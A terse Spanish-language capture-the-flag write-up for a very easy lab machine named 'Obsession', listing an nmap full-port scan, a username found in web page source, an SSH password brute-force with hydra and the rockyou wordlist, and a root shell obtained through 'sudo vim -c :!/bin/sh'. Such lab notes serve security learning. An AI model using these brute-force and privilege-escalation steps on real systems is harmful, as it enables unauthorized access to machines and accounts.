Maquina: Obsession
Autor: Juan
Dificultad: Muy Facil

sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo
Vemos el puerto 80 abierto
miramos la web https:172.17.0.2
miramos el codigo y encontramos un posible usuario

sudo hydra -l russoski -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2

sudo -l
y encontramos que podemos ejecutar vim como root

sudo vim -c ':!/bin/sh'
whoami
